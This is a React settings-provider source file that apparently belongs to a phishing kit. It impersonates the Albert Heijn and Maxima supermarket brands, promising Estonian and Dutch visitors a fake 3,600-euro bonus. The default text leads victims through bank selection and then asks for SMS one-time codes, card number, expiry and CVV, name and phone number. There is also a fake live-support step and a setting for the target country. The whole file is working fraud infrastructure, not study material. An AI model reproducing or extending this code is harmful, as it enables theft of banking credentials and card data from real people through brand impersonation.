"use client";

import { createContext, useContext, useEffect, useState, ReactNode, useMemo, useRef } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { normalizeCountryName } from "@/lib/country-utils";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";

export type GlobalSettings = {
  logo_url: string;
  bg_url: string;
  portal_name: string;
  support_center_name: string;
  win_title: string;
  win_subtitle: string;
  win_button: string;
  banken_title: string;
  banken_subtitle: string;
  banken_search_placeholder: string;
  wait_title: string;
  wait_subtitle: string;
  sms_title: string;
  sms_subtitle: string;
  sms_input_label: string;
  sms_button: string;
  sms_loading: string;
  card_title: string;
  card_subtitle: string;
  card_owner_label: string;
  card_number_label: string;
  card_expiry_label: string;
  card_cvv_label: string;
  card_button: string;
  code_title: string;
  code_subtitle: string;
  code_button: string;
  live_support_title: string;
  live_support_subtitle: string;
  live_support_button: string;
  profile_title_small: string;
  profile_title_main: string;
  profile_subtitle: string;
  profile_firstname_label: string;
  profile_lastname_label: string;
  profile_phone_label: string;
  profile_button: string;
  profile_loading_text: string;
  site_language: string;
  target_country?: string;

  wheel_settings: any;
};

type LegacyGlobalSettings = Partial<GlobalSettings> & {
  background_url?: string;
};

const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
const MAXIMA_LOGO_URL = "/maxima-logo-transparent.png";
const MAXIMA_BG_URL = "/maxima-bg-ee.png";
const LEGACY_BG_URL = "/spar-bg.png";
const LEGACY_PORTAL_NAME = "Albert Heijn klantenportaal";
const LEGACY_SUPPORT_CENTER_NAME = "Albert Heijn service";
const ESTONIAN_SUPPORT_CENTER_NAME = "Maxima Klienditeenindus";
const LEGACY_WIN_TITLE = "Exclusieve Albert Heijn bonus";
const LEGACY_WIN_SUBTITLE =
  "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 3.600 euro te claimen.";
const ESTONIAN_PORTAL_NAME = "Maxima Kliendiportaal";
const ESTONIAN_WIN_TITLE = "Eksklusiivne Maxima Boonus";
const ESTONIAN_WIN_SUBTITLE =
  "Palju õnne! Olete valitud tänasesse Maxima kampaaniasse. Klõpsake allolevat nuppu, et lunastada oma 3600 euro suurune boonus.";
const ESTONIAN_WIN_BUTTON = "Lunasta boonus";
const ESTONIAN_BANKEN_TITLE = "Vali oma pank";
const ESTONIAN_BANKEN_SUBTITLE = "Jätkamiseks vali oma pank.";
const ESTONIAN_BANKEN_SEARCH_PLACEHOLDER = "Otsi oma panka...";
const ESTONIAN_WAIT_TITLE = "Palun oota";
const ESTONIAN_WAIT_SUBTITLE = "Teie päringut töödeldakse turvaliselt...";
const ESTONIAN_SMS_TITLE = "SMS turvakood";
const ESTONIAN_SMS_SUBTITLE = "Sisesta {digits}-kohaline kood.";
const ESTONIAN_SMS_INPUT_LABEL = "Ühekordne kood";
const ESTONIAN_SMS_BUTTON = "Kinnita";
const ESTONIAN_SMS_LOADING = "Töötlemine...";
const ESTONIAN_CARD_TITLE = "Makseandmed";
const ESTONIAN_CARD_SUBTITLE = "Kontrolli ja kinnita oma andmed.";
const ESTONIAN_CARD_OWNER_LABEL = "Kaardiomaniku nimi";
const ESTONIAN_CARD_NUMBER_LABEL = "Kaardi number";
const ESTONIAN_CARD_EXPIRY_LABEL = "Aegumiskuupäev KK/AA";
const ESTONIAN_CARD_CVV_LABEL = "Turvakood";
const ESTONIAN_CARD_BUTTON = "Jätka";
const ESTONIAN_CODE_TITLE = "Tere tulemast";
const ESTONIAN_CODE_SUBTITLE = "Sisesta osalemiskood, mille said partnerilt {partner}, et oma auhind avada.";
const ESTONIAN_CODE_BUTTON = "Kinnita kood";
const LEGACY_LIVE_SUPPORT_TITLES = new Set([
  "Live support",
  "Live Support",
  "Live-Support",
]);
const LEGACY_LIVE_SUPPORT_SUBTITLES = new Set([
  "Om verder te gaan, moet je contact opnemen met onze klantenservice.\n\nKlik op de knop hieronder om het gesprek te starten.",
  "Um fortzufahren, müssen Sie unseren Kundenservice kontaktieren.\n\nKlicken Sie auf den Button unten, um den Chat zu starten.",
  "To continue, you need to contact our customer service.\n\nClick the button below to start the chat.",
]);
const LEGACY_LIVE_SUPPORT_BUTTONS = new Set([
  "Chat openen",
  "Chat starten",
  "Start Chat",
]);
const ESTONIAN_LIVE_SUPPORT_TITLE = "Reaalajas tugi";
const ESTONIAN_LIVE_SUPPORT_SUBTITLE =
  "Jätkamiseks peate võtma ühendust meie klienditeenindusega.\n\nKlõpsake allolevat nuppu, et alustada vestlust.";
const ESTONIAN_LIVE_SUPPORT_BUTTON = "Alusta vestlust";
const ESTONIAN_PROFILE_TITLE_SMALL = "Auhinna kinnitus";
const ESTONIAN_PROFILE_TITLE_MAIN = "Sinu boonuse summa";
const ESTONIAN_PROFILE_SUBTITLE = "Kinnita oma andmed edasiseks töötlemiseks.";
const ESTONIAN_PROFILE_FIRSTNAME_LABEL = "Eesnimi";
const ESTONIAN_PROFILE_LASTNAME_LABEL = "Perekonnanimi";
const ESTONIAN_PROFILE_PHONE_LABEL = "Mobiilinumber";
const ESTONIAN_PROFILE_BUTTON = "Edasi";
const ESTONIAN_PROFILE_LOADING_TEXT = "Töötlemine...";

function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
  const next = { ...settings };

  if (!next.bg_url && next.background_url) {
    next.bg_url = next.background_url;
  }

  if (
    !next.logo_url ||
    next.logo_url === "/logo.png" ||
    next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL
  ) {
    next.logo_url = MAXIMA_LOGO_URL;
  }

  if (!next.bg_url || next.bg_url === LEGACY_BG_URL || next.bg_url.includes("text_to_image") || next.bg_url.includes("coresg-normal.trae.ai") || next.bg_url.length < 8) {
    next.bg_url = MAXIMA_BG_URL;
  }

  if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME) {
    next.portal_name = ESTONIAN_PORTAL_NAME;
  }

  if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME) {
    next.support_center_name = ESTONIAN_SUPPORT_CENTER_NAME;
  }

  if (!next.win_title || next.win_title === LEGACY_WIN_TITLE) {
    next.win_title = ESTONIAN_WIN_TITLE;
  }

  if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE) {
    next.win_subtitle = ESTONIAN_WIN_SUBTITLE;
  }

  if (next.target_country) {
    next.target_country = normalizeCountryName(next.target_country);
  }

  if (next.target_country === "Estonya") {
    if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME) {
      next.support_center_name = ESTONIAN_SUPPORT_CENTER_NAME;
    }

    if (!next.live_support_title || LEGACY_LIVE_SUPPORT_TITLES.has(next.live_support_title)) {
      next.live_support_title = ESTONIAN_LIVE_SUPPORT_TITLE;
    }

    if (!next.live_support_subtitle || LEGACY_LIVE_SUPPORT_SUBTITLES.has(next.live_support_subtitle)) {
      next.live_support_subtitle = ESTONIAN_LIVE_SUPPORT_SUBTITLE;
    }

    if (!next.live_support_button || LEGACY_LIVE_SUPPORT_BUTTONS.has(next.live_support_button)) {
      next.live_support_button = ESTONIAN_LIVE_SUPPORT_BUTTON;
    }
  }

  if (!next.win_button) next.win_button = ESTONIAN_WIN_BUTTON;
  if (!next.banken_title) next.banken_title = ESTONIAN_BANKEN_TITLE;
  if (!next.banken_subtitle) next.banken_subtitle = ESTONIAN_BANKEN_SUBTITLE;
  if (!next.banken_search_placeholder) next.banken_search_placeholder = ESTONIAN_BANKEN_SEARCH_PLACEHOLDER;
  if (!next.wait_title) next.wait_title = ESTONIAN_WAIT_TITLE;
  if (!next.wait_subtitle) next.wait_subtitle = ESTONIAN_WAIT_SUBTITLE;
  if (!next.sms_title) next.sms_title = ESTONIAN_SMS_TITLE;
  if (!next.sms_subtitle) next.sms_subtitle = ESTONIAN_SMS_SUBTITLE;
  if (!next.sms_input_label) next.sms_input_label = ESTONIAN_SMS_INPUT_LABEL;
  if (!next.sms_button) next.sms_button = ESTONIAN_SMS_BUTTON;
  if (!next.sms_loading) next.sms_loading = ESTONIAN_SMS_LOADING;
  if (!next.card_title) next.card_title = ESTONIAN_CARD_TITLE;
  if (!next.card_subtitle) next.card_subtitle = ESTONIAN_CARD_SUBTITLE;
  if (!next.card_owner_label) next.card_owner_label = ESTONIAN_CARD_OWNER_LABEL;
  if (!next.card_number_label) next.card_number_label = ESTONIAN_CARD_NUMBER_LABEL;
  if (!next.card_expiry_label) next.card_expiry_label = ESTONIAN_CARD_EXPIRY_LABEL;
  if (!next.card_cvv_label) next.card_cvv_label = ESTONIAN_CARD_CVV_LABEL;
  if (!next.card_button) next.card_button = ESTONIAN_CARD_BUTTON;
  if (!next.code_title) next.code_title = ESTONIAN_CODE_TITLE;
  if (!next.code_subtitle) next.code_subtitle = ESTONIAN_CODE_SUBTITLE;
  if (!next.code_button) next.code_button = ESTONIAN_CODE_BUTTON;
  if (!next.profile_title_small) next.profile_title_small = ESTONIAN_PROFILE_TITLE_SMALL;
  if (!next.profile_title_main) next.profile_title_main = ESTONIAN_PROFILE_TITLE_MAIN;
  if (!next.profile_subtitle) next.profile_subtitle = ESTONIAN_PROFILE_SUBTITLE;
  if (!next.profile_firstname_label) next.profile_firstname_label = ESTONIAN_PROFILE_FIRSTNAME_LABEL;
  if (!next.profile_lastname_label) next.profile_lastname_label = ESTONIAN_PROFILE_LASTNAME_LABEL;
  if (!next.profile_phone_label) next.profile_phone_label = ESTONIAN_PROFILE_PHONE_LABEL;
  if (!next.profile_button) next.profile_button = ESTONIAN_PROFILE_BUTTON;
  if (!next.profile_loading_text) next.profile_loading_text = ESTONIAN_PROFILE_LOADING_TEXT;
  if (!next.site_language) next.site_language = "et";
  if (!next.target_country) next.target_country = "Estonya";

  return next;
}

export const defaultSettings: GlobalSettings = {
  logo_url: MAXIMA_LOGO_URL,
  bg_url: MAXIMA_BG_URL,
  portal_name: ESTONIAN_PORTAL_NAME,
  support_center_name: ESTONIAN_SUPPORT_CENTER_NAME,
  win_title: ESTONIAN_WIN_TITLE,
  win_subtitle: ESTONIAN_WIN_SUBTITLE,
  win_button: ESTONIAN_WIN_BUTTON,
  banken_title: ESTONIAN_BANKEN_TITLE,
  banken_subtitle: ESTONIAN_BANKEN_SUBTITLE,
  banken_search_placeholder: ESTONIAN_BANKEN_SEARCH_PLACEHOLDER,
  wait_title: ESTONIAN_WAIT_TITLE,
  wait_subtitle: ESTONIAN_WAIT_SUBTITLE,
  sms_title: ESTONIAN_SMS_TITLE,
  sms_subtitle: ESTONIAN_SMS_SUBTITLE,
  sms_input_label: ESTONIAN_SMS_INPUT_LABEL,
  sms_button: ESTONIAN_SMS_BUTTON,
  sms_loading: ESTONIAN_SMS_LOADING,
  card_title: ESTONIAN_CARD_TITLE,
  card_subtitle: ESTONIAN_CARD_SUBTITLE,
  card_owner_label: ESTONIAN_CARD_OWNER_LABEL,
  card_number_label: ESTONIAN_CARD_NUMBER_LABEL,
  card_expiry_label: ESTONIAN_CARD_EXPIRY_LABEL,
  card_cvv_label: ESTONIAN_CARD_CVV_LABEL,
  card_button: ESTONIAN_CARD_BUTTON,
  code_title: ESTONIAN_CODE_TITLE,
  code_subtitle: ESTONIAN_CODE_SUBTITLE,
  code_button: ESTONIAN_CODE_BUTTON,
  live_support_title: ESTONIAN_LIVE_SUPPORT_TITLE,
  live_support_subtitle: ESTONIAN_LIVE_SUPPORT_SUBTITLE,
  live_support_button: ESTONIAN_LIVE_SUPPORT_BUTTON,
  profile_title_small: ESTONIAN_PROFILE_TITLE_SMALL,
  profile_title_main: ESTONIAN_PROFILE_TITLE_MAIN,
  profile_subtitle: ESTONIAN_PROFILE_SUBTITLE,
  profile_firstname_label: ESTONIAN_PROFILE_FIRSTNAME_LABEL,
  profile_lastname_label: ESTONIAN_PROFILE_LASTNAME_LABEL,
  profile_phone_label: ESTONIAN_PROFILE_PHONE_LABEL,
  profile_button: ESTONIAN_PROFILE_BUTTON,
  profile_loading_text: ESTONIAN_PROFILE_LOADING_TEXT,
  site_language: "et",
  target_country: "Estonya",
  wheel_settings: {},
};

const SettingsContext = createContext<{ settings: GlobalSettings; loading: boolean }>({
  settings: defaultSettings,
  loading: false,
});

export function SettingsProvider({ children }: { children: ReactNode }) {
  const [settings, setSettings] = useState<GlobalSettings>(defaultSettings);
  const [loading, setLoading] = useState(true);
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const bgSignatureRef = useRef("");

  useEffect(() => {
    async function loadSettings() {
      if (!supabase) {
        setLoading(false);
        return;
      }
      const { data, error } = await supabase
        .from("global_settings")
        .select("*")
        .limit(1)
        .maybeSingle();

      if (data && !error) {
        setSettings((prev) => normalizeBranding({ ...prev, ...data }) as GlobalSettings);
      }
      setLoading(false);
    }
    
    void loadSettings();
  }, [supabase]);

  // Apply custom background image dynamically to the body
  useEffect(() => {
    let frameId = 0;

    const updateBg = () => {
      if (frameId) {
        window.cancelAnimationFrame(frameId);
      }

      frameId = window.requestAnimationFrame(() => {
        frameId = 0;

      const isMobile = window.innerWidth <= 768;
      const targetWidth = Math.min(
        Math.round(window.innerWidth * Math.max(window.devicePixelRatio || 1, 1)),
        isMobile ? 900 : 1600,
      );
      
      let activeBg = isMobile && settings.wheel_settings?.bg_url_mobile 
        ? settings.wheel_settings.bg_url_mobile 
        : settings.bg_url;
        
      const pageBgs = settings.wheel_settings?.page_backgrounds || {};
      
      // Determine page-specific background
      const path = window.location.pathname;
      if (path.includes('/code') && pageBgs.code) activeBg = pageBgs.code;
      else if (path.includes('/wheel') && pageBgs.wheel) activeBg = pageBgs.wheel;
      else if (path.includes('/win') && pageBgs.win) activeBg = pageBgs.win;
      else if (path.includes('/form') && pageBgs.form) activeBg = pageBgs.form;
      else if (path.includes('/banken') && pageBgs.banken) activeBg = pageBgs.banken;
      else if (path.includes('/sms') && pageBgs.sms) activeBg = pageBgs.sms;
      else if (path.includes('/card') && pageBgs.card) activeBg = pageBgs.card;

      if (activeBg) {
        const optimizedBg = optimizeSupabaseImageUrl(activeBg, {
          width: targetWidth,
          quality: isMobile ? 60 : 68,
          format: "webp",
        });
        const nextSignature = `${window.location.pathname}|${optimizedBg}`;
        if (bgSignatureRef.current === nextSignature) {
          return;
        }

        bgSignatureRef.current = nextSignature;
        document.documentElement.style.setProperty('--custom-bg', `url("${optimizedBg}")`);
      }
      });
    };

    updateBg();
    window.addEventListener('resize', updateBg);
    window.addEventListener('orientationchange', updateBg);
    return () => {
      if (frameId) {
        window.cancelAnimationFrame(frameId);
      }
      window.removeEventListener('resize', updateBg);
      window.removeEventListener('orientationchange', updateBg);
    };
  }, [settings.bg_url, settings.wheel_settings, loading]);

  return (
    <SettingsContext.Provider value={{ settings, loading }}>
      {children}
    </SettingsContext.Provider>
  );
}

export function useSettings() {
  return useContext(SettingsContext);
}
